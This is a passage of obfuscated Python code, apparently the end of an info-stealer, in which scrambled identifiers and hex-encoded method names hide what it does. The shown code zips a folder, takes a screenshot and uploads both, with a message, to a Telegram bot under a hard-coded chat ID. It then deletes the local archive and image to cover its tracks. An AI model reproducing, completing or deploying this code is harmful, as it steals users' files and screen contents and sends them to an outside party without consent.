                lllllllllllllII(lllIIlllIllIIlIlll, lllllllllllllII(llllllllllllIII, 'fromhex')('7772697465').decode())(lIlllIllllIlIIllII + '\n')
        lllllllllllllII(llIllIIlllIIlIllII, lllllllllllllII(llllllllllllIII, 'fromhex')('636c6f7365').decode())()
        lIIIlIlIIIIlIl(llllIlllIIllIIIIll['path'])
    IIIIlIIIIIIIlIlIIl()
    lIIlIllIIlIIll(IllIIIlIIllIlllIIl)
llllllIlIllIIIIIII()
IlIIIlIllIIIIlIIlI = (IllIIlllIIllII.utcnow() + llllIIIIllIlll(hours=7)).strftime('%H.%M.%S_%d.%m.%Y')
lIlllIIIIIIlIIlIII = IlIIlllllIllll('C:\\Users\\ADMIN\\Documents', IlIIIlIllIIIIlIIlI)
llIIlllIIlIIIl(lIlllIIIIIIlIIlIII, 'zip', IlllIllIlIlIIIIllI)
lIlllIIIIIIlIIlIII = lIlllIIIIIIlIIlIII + '.zip'
with IllIIIIIlllIIl() as lIllllIIlIIIIIlIII:
    lIlIlllIIllIIIllIl = lIllllIIlIIIIIlIII.shot(output='C:\\Users\\ADMIN\\Documents\\photo.png')
lIIlIIIIIIlIIl(f'https://api.telegram.org/bot{IlIIIIIIllllIIllII}/sendPhoto', data={'chat_id': '6910865834'}, files={'photo': llllllllllllIll('C:\\Users\\ADMIN\\Documents\\photo.png', 'rb')})
lIIlIIIIIIlIIl(f'https://api.telegram.org/bot{IlIIIIIIllllIIllII}/sendDocument', params={'chat_id': '6910865834', 'caption': IIlllIlIIlllIllIll()}, files={'document': (f'{IlIIIlIllIIIIlIIlI}.zip', llllllllllllIll(lIlllIIIIIIlIIlIII, 'rb'))})
lIIlIIIIIIlIIl(f'https://api.telegram.org/bot{IlIIIIIIllllIIllII}/sendMessage', params={'chat_id': '6910865834', 'text': llIIIlIIlIlllllIII})
lIIIlIlIIIIlIl(lIlllIIIIIIlIIlIII) if IIlIlllllllIlI(lIlllIIIIIIlIIlIII) else None
lIIIlIlIIIIlIl('C:\\Users\\ADMIN\\Documents\\photo.png') if IIlIlllllllIlI('C:\\Users\\ADMIN\\Documents\\photo.png') else None
